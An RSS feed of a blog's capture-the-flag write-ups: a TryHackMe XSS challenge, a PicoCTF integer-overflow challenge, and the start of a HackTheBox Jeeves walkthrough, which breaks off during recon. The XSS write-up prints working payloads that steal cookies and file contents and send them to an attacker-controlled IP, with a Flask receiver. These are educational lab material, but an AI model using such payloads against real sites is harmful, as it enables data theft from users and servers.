<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Posts on Ep1cac</title>
    <link>http://localhost:1313/posts/</link>
    <description>Recent content in Posts on Ep1cac</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>Ep1cac</copyright>
    <lastBuildDate>Fri, 29 Nov 2024 16:02:41 -0600</lastBuildDate><atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
    
    
    <item>
      <title>The Sticker Shop</title>
      <link>http://localhost:1313/posts/the_sticker_shop/</link>
      <pubDate>Fri, 29 Nov 2024 16:02:41 -0600</pubDate>
      
      <guid>http://localhost:1313/posts/the_sticker_shop/</guid>
      <description><![CDATA[<p><img src="/img/the_sticker_shop/the_sticker_shop.png#center" alt="The Sticker Shop"></p>
<h3 id="description">Description</h3>
<p><a href="https://tryhackme.com/r/room/thestickershop">The Sticker Shop</a> is an easy-rated challenge on Tryhackme. We exfiltrate <code>flag.txt</code> from the web server through a XSS attack.</p>
<h3 id="walkthrough">Walkthrough</h3>
<p>We are told that we need to read the flag at <code>http://10.10.102.204:8080/flag.txt</code>. However, visiting the URL, we are met with a 401 Unauthorized message, meaning we are not authenticated to view the file.</p>
<p><img src="/img/the_sticker_shop/401.png" alt="Direct access 401 forbidden"></p>
<p>If we backtrack to the webapp&rsquo;s homepage, we see that there is a page for submitting feedback where we can presumably send content to the sticker shop staff. This might be our way in.</p>
<p><img src="/img/the_sticker_shop/feedback.png" alt=""></p>
<p>I started by sending a simple XSS payload to attempt to exfiltrate user cookies.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.13.48.55/?c=&#34;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.102.204 - - [29/Nov/2024 19:56:47] &#34;GET /?c= HTTP/1.1&#34; 200 -
10.10.102.204 - - [29/Nov/2024 19:56:58] &#34;GET /?c= HTTP/1.1&#34; 200 -
</code></pre><p>Unfortunately, this does not work. The webapp may have some sort of defense mechanism (e.g. HttpOnly). Heck, it may not be using cookies at all. Without further information, it will be difficult to obtain any account secrets, if they exist in the first place. We need to focus on directly accessing <code>flag.txt</code> through our XSS payload instead.</p>
<p>A quick and dirty way of doing this would be embedding <code>flag.txt</code>&rsquo;s contents into a query string. Below is a payload that reads <code>flag.txt</code> on the server side and sends the data back to us with a GET request.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">&#34;http://10.13.48.55&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span>)
</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://127.0.0.1:8080/flag.txt&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">error</span>));
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p><img src="/img/the_sticker_shop/flag_get.png" alt="Quick and dirty GET flag"></p>
<p>But what if you want to read a file that is much larger, or you don&rsquo;t want the data to be visible in the URL, perhaps for greater stealth? In that case, you would be better off using POST instead of GET.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.13.48.55&#34;</span>, {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/json&#34;</span>
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">data</span>)
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://127.0.0.1:8080/flag.txt&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>)
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>The problem is that Python&rsquo;s simple HTTP server only supports GET and HEAD requests, and the sticker website is sending a preflight request, so netcat is out of the question as well&hellip;</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.102.204] 52614
OPTIONS / HTTP/1.1
Host: 10.13.48.55
Connection: keep-alive
Accept: */*
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
Origin: http://127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Sec-Fetch-Mode: cors
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
</code></pre><p>We need to respond appropriately in order to receive the POST request containing <code>flag.txt</code>. Specifically, we need to respond with the correct <code>Access-Control-Allow-Origin</code>, <code>Access-Control-Allow-Methods</code>, and <code>Access-Control-Allow-Headers</code> headers.</p>
<pre tabindex="0"><code>Access-Control-Allow-Origin: Specifies what domains are allowed to access a resource.
Access-Control-Allow-Methods: Indicates which HTTP methods are allowed.
Access-Control-Allow-Headers: Represents the HTTP headers that are permitted.
</code></pre><p>Now to whitelist any host<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, the HTTP POST and OPTIONS, as well as the Content-Type header. I spun up a Flask server to do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;OPTIONS&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handler</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;OPTIONS&#39;</span>:
</span></span><span style="display:flex;"><span>        headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Access-Control-Allow-Origin&#39;</span> : <span style="color:#e6db74">&#39;*&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Access-Control-Allow-Methods&#39;</span> : <span style="color:#e6db74">&#39;POST, OPTIONS&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Access-Control-Allow-Headers&#39;</span> : <span style="color:#e6db74">&#39;Content-Type&#39;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">200</span>, headers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get_json()
</span></span><span style="display:flex;"><span>        print(data)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">405</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run()
</span></span></code></pre></div><p>And now, we should successfully receive our flag.</p>
<p><img src="/img/the_sticker_shop/flag.png" alt="POST flag"></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>The request from flag shop comes from a random high port and there is no way to allow a single IP and any port on its.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>PicoCTF: flag_shop</title>
      <link>http://localhost:1313/posts/flag_shop/</link>
      <pubDate>Wed, 20 Nov 2024 14:26:45 -0600</pubDate>
      
      <guid>http://localhost:1313/posts/flag_shop/</guid>
      <description><![CDATA[<h3 id="description">Description</h3>
<p>flag_shop is a challenge on PicoCTF where an integer overflow vulnerability allows for the purchase of an 1337 flag where we otherwise would have insufficient funds.</p>
<h3 id="walkthrough">Walkthrough</h3>
<h4 id="functionality-testing">Functionality Testing</h4>
<p>Connecting to the Pico server, we get a menu with several options.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nc jupiter.challenges.picoctf.org 9745
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
</code></pre><p>We can see our account balance.</p>
<pre tabindex="0"><code> Enter a menu selection
1



 Balance: 1100 
</code></pre><p>We can also buy flags, of which there are two options. Options 1 costs 900 each, whereas option 2, the &ldquo;1337 flag&rdquo;, costs 100000 each.</p>
<pre tabindex="0"><code> Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
</code></pre><pre tabindex="0"><code>2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
</code></pre><p>We are asked to buy a flag, presumably the 1337 flag, so let&rsquo;s get started.</p>
<h4 id="code-review">Code Review</h4>
<p>The first thing that caught my eye was the usage the unsecure <code>scanf()</code>. <code>scanf()</code> takes data from
standard input and stores it to the address of a variable. However, it does not set a limit on the size of user input, meaning
it is vulnerable to overflow. For this challenge, we do not need to exploit <code>scanf()</code>, but it is still something worth
keeping in mind.</p>
<p>We also see that the <code>store.c</code> uses an integer to store the total cost of the flags in
<code>total_cost</code>, meaning it can be interpreted as positive or negative. <code>total_cost</code> is derived by multiplying the cost of flag 1
(900) with the number of flags our user wants to buy, so the number of flags we buy could flip the most significant bit of <code>total_cost</code> to 1,
turning it into a negative number.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(auction_choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;These knockoff Flags cost 900 each, enter desired quantity</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> number_flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fflush</span>(stdin);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>number_flags);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(number_flags <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">int</span> total_cost <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                    total_cost <span style="color:#f92672">=</span> <span style="color:#ae81ff">900</span><span style="color:#f92672">*</span>number_flags;
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">The final cost is: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, total_cost);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(total_cost <span style="color:#f92672">&lt;=</span> account_balance){
</span></span><span style="display:flex;"><span>                        account_balance <span style="color:#f92672">=</span> account_balance <span style="color:#f92672">-</span> total_cost;
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Your current balance after transaction: %d</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, account_balance);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not enough funds to complete purchase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                    }   
</span></span><span style="display:flex;"><span>                }   
</span></span><span style="display:flex;"><span>            }
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>In two&rsquo;s complement, the most significant bit, or leftmost digit determines whether a number is positive (0) or negative (1).
When our total cost ends up being greater than the maximum positive integer, the cost becomes negative if the most significant bit is 1.
Since the price of a flag is 900, we can overflow our cost by buying <code>maximum_integer/price_per_flag</code> flags. Of course, this value needs to be
rounded up (or +1 if the quotient is a whole number).</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ python3
Python 3.12.6 (main, Sep  7 2024, 14:20:15) [GCC 14.2.0] on linux
Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
&gt;&gt;&gt; import math
&gt;&gt;&gt; math.ceil(2147483647/900)
2386093
&gt;&gt;&gt; 2147483647/900
2386092.941111111
</code></pre><p>However, when I try to buy 2386093 flags, I am thrown deep into debt!</p>
<pre tabindex="0"><code>These knockoff Flags cost 900 each, enter desired quantity
2386093

The final cost is: -2147483596

Your current balance after transaction: -2147482600
</code></pre><p>Let us figure out why this is happening. I&rsquo;ve provided a script below to find the binary representation of an integer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;strings.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getBin</span>(<span style="color:#66d9ef">int</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) 
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Usage: %s &lt;num&gt;&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getBin</span>(<span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">1</span>]));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getBin</span>(<span style="color:#66d9ef">int</span> num)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> bin[<span style="color:#ae81ff">33</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        bin[index] <span style="color:#f92672">=</span> (num <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">48</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">30</span>; i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>                index<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">&amp;</span> i <span style="color:#f92672">?</span> (bin[index] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>) <span style="color:#f92672">:</span> (bin[index] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        bin[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Number: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, num);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Binary: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Calculating our remaining funds, we get 2147483596.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ ./int2bin $(( 0-2386093*900  ))
Number: 2147483596
Binary: 01111111111111111111111111001100
</code></pre><p>However, we start with 1100 in our balance, not 0. If we recalculate our balance with that accounted for, we get -2147482600.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ ./int2bin $(( 1100-2386093*900  ))
Number: -2147482600
Binary: 10000000000000000000010000011000
</code></pre><p>The easiest way to fix this debacle would be to add 1100/900 when calculating the number of flags we need to buy since
we will need to overflow an additional 1100 for flags that cost 900 each.</p>
<pre tabindex="0"><code>&gt;&gt;&gt; math.ceil(2147483647/900+1100/900)
2386095
</code></pre><p>And now we have 2147482896 in our account after the transaction, more than enough to buy the 1337 flag.</p>
<pre tabindex="0"><code>These knockoff Flags cost 900 each, enter desired quantity
2386095

The final cost is: -2147481796

Your current balance after transaction: 2147482896
</code></pre><pre tabindex="0"><code>Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_&lt;redacted&gt;}
Welcome to the flag exchange
We sell flags
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Jeeves</title>
      <link>http://localhost:1313/posts/jeeves/</link>
      <pubDate>Mon, 11 Nov 2024 12:54:22 -0600</pubDate>
      
      <guid>http://localhost:1313/posts/jeeves/</guid>
      <description><![CDATA[<p><img src="/img/jeeves/jeeves.png#center" alt="Jeeves"></p>
<h3 id="description">Description</h3>
<p>Jeeves is a medium-difficult machine on HackTheBox. There is a Jenkins dashboard where unauthenticated users can access the Script Console and get a reverse shell. After the initial foothold, gaining access to a KeePass database file reveals Administrator&rsquo;s NTLM hash.</p>
<h3 id="recon">Recon</h3>
<p>Starting off with a nmap scan:</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Mon Nov 11 13:02:01 2024 as: nmap -p- -A -v -T4 -oN /tmp/nmap.scan 10.10.10.63
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
Nmap scan report for 10.10.10.63
Host is up (0.043s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.007 days (since Mon Nov 11 12:55:57 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-12T00:05:55
|_  start_date: 2024-11-11T23:57:06
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m56s, deviation: 0s, median: 5h00m56s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.96 ms 10.10.14.1
2   45.71 ms 10.10.10.63

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 11 13:05:35 2024 -- 1 IP address (1 host up) scanned in 214.46 seconds
</code></pre><p>I found several services, including SMB, RPC, and two HTTP servers on ports 80 and 50000. Enumerating the web server on port 80 and SMB do not reveal anything interesting. I was able to use RPC to find some endpoints, but I did not see anyway I could exploit Jeeves with the information.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ impacket-rpcdump -p 135 10.10.10.63
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Retrieving endpoint list from 10.10.10.63
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.63[49664]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]
          ncalrpc:[WMsgKRpc097A31]

Protocol: N/A 
Provider: N/A 
UUID    : 9B008953-F195-4BF9-BDE0-4471971E58ED v1.0 
Bindings: 
          ncalrpc:[LRPC-f01d6a34deb1026cb0]
          ncalrpc:[dabrpc]
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-f24b240fdec2bc8c52]
          ncalrpc:[LRPC-bb6163cae863dbd5f9]
          ncalrpc:[LRPC-82dd959ab6b7e8366d]
          ncacn_np:\\JEEVES[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-300bf2e2daeee2de9a]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]

...
</code></pre><p>However, I did find an interesting directory on the port 50000 website.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -C 404 -n
                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben &#34;epi&#34; Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
